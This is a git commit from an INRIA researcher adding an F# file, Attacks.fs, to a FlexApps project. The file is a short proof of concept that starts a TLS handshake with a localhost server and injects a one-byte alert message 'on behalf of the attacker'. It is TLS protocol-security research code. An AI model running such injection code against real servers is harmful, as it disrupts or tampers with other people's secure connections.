f936d8858c4f1c8c3928822a98a4c2dcba878c48
Alfredo Pironti <alfredo.pironti@inria.fr>
2014-09-01 16:59:56 +0200

    Add an initial FlexApps project

---
+++ FlexApps/Attacks.fs
@@ -0,0 +1,24 @@
+﻿module Attacks
+
+open FlexTypes
+open FlexConnection
+open FlexClientHello
+open FlexServerHello
+open FlexAlert
+
+let alertAttack peer name =
+    // Connect to the server
+    let st,cfg = FlexConnection.clientOpenTcpConnection(peer,name) in
+
+    // Start an RSA handshake with the server
+    let st,nsc,ch = FlexClientHello.send(st) in
+    let st,nsc,sh = FlexServerHello.receive(st,nsc) in
+
+    // Inject a one byte alert on behalf of the attacker
+    let _ = FlexAlert.send(st,Bytes.abytes [|1uy|])
+    ()
+
+[<EntryPoint>]
+let main argv = 
+    alertAttack "localhost" "localhost"
+    0
